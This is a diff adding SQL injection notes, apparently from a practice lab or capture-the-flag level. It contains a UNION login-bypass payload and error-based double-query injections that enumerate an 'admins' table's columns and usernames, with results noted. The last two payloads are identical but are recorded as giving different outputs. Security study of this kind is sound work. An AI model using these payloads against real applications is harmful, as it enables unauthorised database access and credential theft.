@@ -879,3 +879,21 @@ admin") or "1"="1"#
 admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
+
+
+username=' UNION SELECT "butters" as password FROM admins WHERE '1' = '1
+password=butters
+
+
+username=foo' OR (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1
+    shows table name admin
+username=foo' or (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x61646d696e73 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1
+    gives id row
+username=foo' or (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x61646d696e73 limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1
+    gives username row
+username=foo' or (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x61646d696e73 limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1
+    gives password row
+username=foo' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.username as char),0x27,0x7e) FROM `level2`.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1
+    gives wonda
+username=foo' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.username as char),0x27,0x7e) FROM `level2`.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1
+    gives denver
